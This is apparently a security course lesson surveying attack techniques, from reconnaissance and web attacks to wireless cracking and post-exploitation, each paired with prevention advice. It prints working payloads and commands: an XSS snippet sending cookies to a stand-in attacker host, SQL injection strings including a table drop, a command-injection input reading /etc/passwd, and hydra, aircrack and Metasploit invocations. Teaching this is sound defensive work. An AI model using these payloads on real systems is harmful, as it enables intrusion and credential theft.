# Cyber Threats & Attack Techniques/Exploits

Now we get into the offensive side—how attacks actually work. Understanding attack techniques is essential for defense. You can't protect against threats you don't understand. This lesson covers real-world attack methods used by hackers, from reconnaissance to exploitation to post-compromise activity.

## The Cyber Kill Chain

Before diving into specific attacks, understand the typical attack lifecycle. Lockheed Martin developed the **Cyber Kill Chain** model describing stages of a cyber attack:

1. **Reconnaissance**: Gather information about target
2. **Weaponization**: Create malicious payload
3. **Delivery**: Transmit weapon to target
4. **Exploitation**: Trigger vulnerability
5. **Installation**: Install malware/backdoor
6. **Command and Control (C2)**: Establish communication channel
7. **Actions on Objectives**: Achieve attacker's goal (steal data, cause damage, etc.)

Understanding this chain helps defenders disrupt attacks at various stages.

## Phase 1: Reconnaissance

**Reconnaissance** is information gathering about a target. The more an attacker knows, the better they can plan their attack.

### Passive Reconnaissance

Gathering information without directly interacting with the target:

**OSINT (Open Source Intelligence):**
- Public websites and social media
- LinkedIn profiles (find employees, technology stacks)
- Job postings (reveal technologies used)
- Press releases and news articles
- Public financial records
- Domain registration information (WHOIS)
- Search engines (Google dorking)

**Example Google dorks:**
```
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com intitle:"index of"
"@target.com" site:pastebin.com
```

**Shodan**: Search engine for internet-connected devices
- Find exposed databases, webcams, industrial control systems
- Identify vulnerable services
- Map organization's internet-facing assets

**The Wayback Machine**: View historical versions of websites
- Find old vulnerabilities
- Discover forgotten subdomains
- Locate removed content

**DNS Enumeration:**
```bash
# Find DNS records
dig target.com ANY
nslookup -type=any target.com

# Find mail servers
dig target.com MX

# Zone transfer attempt (usually blocked)
dig @ns1.target.com target.com AXFR
```

### Active Reconnaissance

Directly interacting with target systems:

**Port Scanning (using Nmap):**
```bash
# Basic scan
nmap target.com

# Service and version detection
nmap -sV target.com

# OS detection
nmap -O target.com

# Aggressive scan (combination of techniques)
nmap -A target.com

# Scan specific ports
nmap -p 80,443,8080 target.com

# Scan all ports
nmap -p- target.com

# Stealth SYN scan
sudo nmap -sS target.com
```

**Network Mapping:**
```bash
# Ping sweep to find live hosts
nmap -sn 192.168.1.0/24

# Traceroute
traceroute target.com

# Identify routing path
mtr target.com
```

**Web Application Reconnaissance:**
- Directory enumeration (find hidden pages)
- Technology fingerprinting (identify frameworks, CMS)
- Subdomain discovery
- API endpoint discovery

**Tools:**
- **Nikto**: Web server scanner
- **Dirb/Dirbuster**: Directory brute-forcing
- **WhatWeb**: Website fingerprinting
- **Amass**: Subdomain enumeration

## Phase 2: Scanning and Enumeration

After reconnaissance, attackers probe for specific vulnerabilities.

### Vulnerability Scanning

**Automated scanners:**
- **Nessus**: Enterprise vulnerability scanner
- **OpenVAS**: Open-source alternative
- **Nmap scripts**: NSE (Nmap Scripting Engine)

These tools identify:
- Unpatched software
- Misconfigurations
- Default credentials
- Known vulnerabilities (CVEs)

### Service Enumeration

Gather detailed information about discovered services:

**Banner Grabbing:**
```bash
# Telnet to grab banner
telnet target.com 80
HEAD / HTTP/1.0

# Netcat
nc target.com 80
HEAD / HTTP/1.0

# Nmap
nmap -sV --script=banner target.com
```

**SMB Enumeration (Windows shares):**
```bash
# List shares
smbclient -L //target.com -N

# Enum4linux (comprehensive SMB enumeration)
enum4linux -a target.com
```

**SNMP Enumeration:**
```bash
# SNMP walk
snmpwalk -v2c -c public target.com
```

## Web Application Attacks

Web applications are a primary attack surface. Let's examine common vulnerabilities:

### SQL Injection

**SQL injection** allows attackers to execute arbitrary SQL commands by manipulating input.

**Vulnerable code example:**
```python
# BAD - vulnerable to SQL injection
user_input = request.form['username']
query = f"SELECT * FROM users WHERE username = '{user_input}'"
cursor.execute(query)
```

**Attack:**
```
Username: admin'--
Password: anything

Resulting query:
SELECT * FROM users WHERE username = 'admin'--' AND password = 'hash'
-- Everything after -- is commented out, bypassing password check
```

**More advanced:**
```
' OR '1'='1
' UNION SELECT password FROM users--
'; DROP TABLE users;--
```

**Detection:**
Try injecting: `'`, `"`, `1'1`, `1"1`
Look for: Database errors, unexpected behavior

**Tools:**
- **SQLmap**: Automated SQL injection tool
```bash
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D database --tables
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump
```

**Prevention:**
- Use parameterized queries / prepared statements
- Input validation
- Least privilege database accounts
- WAF (Web Application Firewall)

### Cross-Site Scripting (XSS)

**XSS** allows attackers to inject malicious JavaScript into web pages viewed by other users.

**Types:**

**Stored XSS**: Script stored in database (most dangerous)
```html
Comment field input:
<script>
  // Steal cookies
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**Reflected XSS**: Script in URL, reflected back
```
http://target.com/search?q=<script>alert(document.cookie)</script>
```

**DOM-based XSS**: Client-side script manipulation

**Impact:**
- Cookie theft (session hijacking)
- Keylogging
- Phishing via injected forms
- Defacement
- Redirect to malicious sites

**Prevention:**
- Output encoding/escaping
- Content Security Policy (CSP)
- HTTPOnly cookies
- Input validation

### Cross-Site Request Forgery (CSRF)

**CSRF** tricks users into performing actions they didn't intend.

**Example attack:**
Victim is logged into bank.com. Attacker sends email with:
```html
<img src="http://bank.com/transfer?to=attacker&amount=1000">
```

When victim opens email, their browser automatically sends authenticated request to transfer money.

**Prevention:**
- CSRF tokens (random, unpredictable values)
- SameSite cookie attribute
- Verify origin header
- Require re-authentication for sensitive actions

### Command Injection

Application executes system commands with user input without proper sanitization.

**Vulnerable code:**
```python
# BAD
ip = request.form['ip']
os.system(f'ping -c 4 {ip}')
```

**Attack:**
```
Input: 8.8.8.8; cat /etc/passwd
Executes: ping -c 4 8.8.8.8; cat /etc/passwd
```

**Command chaining:**
- `;` - execute multiple commands
- `&&` - execute if previous succeeded
- `||` - execute if previous failed
- `|` - pipe output

### Directory Traversal / Path Traversal

Access files outside intended directory.

**Example:**
```
http://target.com/download?file=../../../etc/passwd
```

Can access:
- Configuration files
- Source code
- Sensitive data
- System files

**Prevention:**
- Input validation
- Whitelist allowed files
- Canonicalize paths
- Restrict file system permissions

### File Upload Vulnerabilities

Uploading malicious files that execute on server.

**Attacks:**
1. Upload PHP shell disguised as image
2. Bypass filters with double extensions: `shell.php.jpg`
3. Bypass MIME type checks
4. Upload file to accessible directory
5. Navigate to uploaded file, execute commands

**Prevention:**
- Validate file type (magic bytes, not just extension)
- Store uploads outside web root
- Rename uploaded files
- Execute with minimal permissions
- Scan uploads for malware

## Network Attacks

### Man-in-the-Middle (MitM)

Attacker intercepts communication between two parties.

**ARP Spoofing/Poisoning:**
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoof (using arpspoof)
arpspoof -i eth0 -t victim_ip gateway_ip
arpspoof -i eth0 -t gateway_ip victim_ip
```

Now all traffic between victim and gateway flows through attacker.

**DNS Spoofing**: Provide false DNS responses
**SSL Stripping**: Downgrade HTTPS to HTTP
**Session Hijacking**: Steal session cookies

**Tools:**
- **Ettercap**: Comprehensive MitM framework
- **Bettercap**: Modern network attack and monitoring tool
- **mitmproxy**: Interactive HTTPS proxy

**Prevention:**
- HTTPS everywhere
- HSTS (HTTP Strict Transport Security)
- Certificate pinning
- ARP inspection
- Network monitoring

### Denial of Service (DoS) / Distributed DoS (DDoS)

Overwhelm system resources to make service unavailable.

**Types:**

**Volume-based attacks:**
- UDP floods
- ICMP floods
- Amplification attacks (DNS, NTP, SSDP)

**Protocol attacks:**
- SYN flood (exhaust connection table)
- ACK flood
- Fragmentation attacks

**Application layer attacks:**
- HTTP flood (legitimate-looking requests)
- Slowloris (keep connections open)
- XML bomb / Billion laughs attack

**DDoS**: Same attacks from many sources (botnet)

**Amplification attacks:**
Attacker spoofs victim's IP, sends small requests to servers that send large responses to victim.

**Example - DNS amplification:**
1. Attacker sends DNS query with spoofed source (victim's IP)
2. DNS server sends large response to victim
3. Amplification factor: 1 byte sent → 100 bytes to victim

**Prevention:**
- Rate limiting
- Load balancing
- CDN services (Cloudflare, Akaike)
- DDoS mitigation services
- Network filtering
- Redundancy

### Password Attacks

**Brute Force**: Try every possible combination
```bash
# Hydra - network login brute force
hydra -l admin -P wordlist.txt target.com ssh

# John the Ripper - password hash cracking
john --wordlist=rockyou.txt hashes.txt
```

**Dictionary Attack**: Try common passwords from wordlist
```bash
# Hashcat - GPU-accelerated cracking
hashcat -m 0 -a 0 hashes.txt rockyou.txt
```

**Credential Stuffing**: Use leaked credentials from other breaches

**Pass-the-Hash**: Use password hash without cracking it

**Rainbow Tables**: Precomputed hash tables

**Tools:**
- **Hydra**: Network login brute force
- **John the Ripper**: Password cracking
- **Hashcat**: GPU-accelerated cracking
- **Medusa**: Parallel brute-forcing
- **CeWL**: Create custom wordlists from websites

**Prevention:**
- Strong password policies
- Account lockout after failed attempts
- MFA (multi-factor authentication)
- Password hashing with salt
- Rate limiting
- Monitoring for credential stuffing patterns

## Social Engineering

**Social engineering** exploits human psychology rather than technical vulnerabilities.

### Phishing

Fraudulent attempts to obtain sensitive information.

**Types:**
- **Email phishing**: Mass emails pretending to be legitimate
- **Spear phishing**: Targeted emails to specific individuals
- **Whaling**: Targeted at executives
- **Smishing**: SMS phishing
- **Vishing**: Voice call phishing

**Tactics:**
- Urgency ("Your account will be closed!")
- Authority ("This is IT, send me your password")
- Fear ("You've been hacked, click here")
- Curiosity ("Look at this crazy video of you")
- Greed ("You've won a prize!")

**Prevention:**
- Security awareness training
- Email filtering
- Verify unexpected requests through different channel
- Check sender addresses carefully
- Hover over links before clicking

### Pretexting

Creating fabricated scenario to obtain information.

Example: Attacker calls as IT support needing password to "fix" problem.

### Baiting

Leaving infected USB drives, offering free downloads, etc.

### Tailgating / Piggybacking

Following authorized person through secure door.

### Dumpster Diving

Searching trash for sensitive information.

**Best defense against social engineering**: User education and healthy skepticism.

## Wireless Attacks

### Wi-Fi Attacks

**WEP Cracking** (outdated but still seen):
```bash
# Capture packets
airodump-ng wlan0mon

# Crack WEP key
aircrack-ng capture.cap
```

**WPA/WPA2 Attacks:**
```bash
# Capture handshake
airodump-ng -c 6 --bssid [AP MAC] -w capture wlan0mon

# Deauth clients to force handshake
aireplay-ng --deauth 10 -a [AP MAC] wlan0mon

# Crack with wordlist
aircrack-ng -w wordlist.txt capture.cap
```

**Evil Twin Attack:**
1. Create fake access point with same SSID
2. Stronger signal than legitimate AP
3. Users connect to fake AP
4. Intercept all traffic

**Tools:**
- **Aircrack-ng suite**: Complete wireless security toolkit
- **Wifite**: Automated wireless attack tool
- **Reaver**: WPS attack tool
- **Kismet**: Wireless network detector

### Bluetooth Attacks

**Bluejacking**: Sending unsolicited messages
**Bluesnarfing**: Stealing data from device
**Bluebugging**: Taking control of device

## Malware and Exploitation

### Common Malware Types

**Ransomware**: Encrypts files, demands payment
**Keyloggers**: Record keystrokes
**RATs** (Remote Access Trojans): Give attacker full control
**Banking Trojans**: Steal financial credentials
**Adware/Spyware**: Display ads, track behavior
**Rootkits**: Hide malware presence
**Bootkits**: Infect boot process
**Fileless malware**: Runs in memory, no files written to disk

### Exploitation Frameworks

**Metasploit**: Most popular exploitation framework
```bash
# Start Metasploit
msfconsole

# Search for exploits
search apache

# Use an exploit
use exploit/unix/webapp/php_cgi_arg_injection

# Set options
set RHOST target.com
set RPORT 80

# Run exploit
exploit
```

**Components:**
- **Exploits**: Code that takes advantage of vulnerabilities
- **Payloads**: Code that runs after successful exploit (shell, meterpreter)
- **Encoders**: Obfuscate payloads to evade detection
- **Post modules**: Run after compromise (escalate privileges, pivot)

## Post-Exploitation

After gaining initial access, attackers:

### Privilege Escalation

**Vertical escalation**: Low privilege → high privilege (user → root)
**Horizontal escalation**: Access other users' accounts

**Linux privilege escalation:**
- SUID binaries with vulnerabilities
- Kernel exploits
- Misconfigured sudo
- Writable system files
- Cron jobs as root

**Windows privilege escalation:**
- Unpatched vulnerabilities
- Misconfigured services
- Weak registry/file permissions
- Token impersonation
- DLL hijacking

### Persistence

Maintaining access after reboot or remediation.

**Methods:**
- Create backdoor accounts
- Install rootkits
- Modify startup scripts
- Schedule tasks
- Web shells
- Remote access tools

### Lateral Movement

Moving from initially compromised system to other systems.

**Techniques:**
- Pass-the-hash
- Credential dumping
- Exploiting trust relationships
- Remote command execution
- Pivoting through compromised systems

### Data Exfiltration

Stealing data without detection.

**Methods:**
- FTP/HTTP upload
- DNS tunneling
- Steganography
- Encrypted channels
- Physical media
- Cloud storage

## Advanced Persistent Threats (APTs)

Sophisticated, prolonged attacks (often nation-state):

**Characteristics:**
- Well-funded, skilled attackers
- Specific targets
- Long-term access
- Custom malware
- Multiple attack vectors
- Attempts to avoid detection

**Kill chain:**
1. Initial reconnaissance
2. Initial compromise (spear phishing, zero-day exploits)
3. Establish foothold
4. Escalate privileges
5. Internal reconnaissance
6. Lateral movement
7. Maintain presence
8. Exfiltrate data

**Examples:**
- APT28/Fancy Bear (Russian)
- APT29/Cozy Bear (Russian)
- APT1/Comment Crew (Chinese)
- Equation Group (NSA)

## Detection and Attribution

### Indicators of Compromise (IoCs)

Evidence of intrusion:
- Unusual network traffic
- Suspicious processes
- New user accounts
- Modified system files
- Registry changes
- Unexpected outbound connections

### Tactics, Techniques, and Procedures (TTPs)

Behavioral patterns of threat actors.

**MITRE ATT&CK Framework**: Knowledge base of adversary tactics and techniques

Categories:
- Initial Access
- Execution
- Persistence
- Privilege Escalation
- Defense Evasion
- Credential Access
- Discovery
- Lateral Movement
- Collection
- Command and Control
- Exfiltration
- Impact

Used for threat modeling and detection development.

## Key Takeaways

Understanding attacks requires knowing:
1. **Kill chain stages**: Reconnaissance → Exploitation → Post-compromise
2. **Common vulnerabilities**: SQL injection, XSS, misconfigurations
3. **Attack types**: Network, web, wireless, social engineering
4. **Tools**: Nmap, Metasploit, Burp Suite, Wireshark
5. **Post-exploitation**: Escalation, persistence, lateral movement

**Remember**: This knowledge is for defense. Understanding how attacks work enables you to:
- Identify vulnerabilities before attackers do
- Detect attacks in progress
- Design better security controls
- Respond effectively to incidents

In the next lesson, we'll cover defensive techniques and how to protect against these attacks.
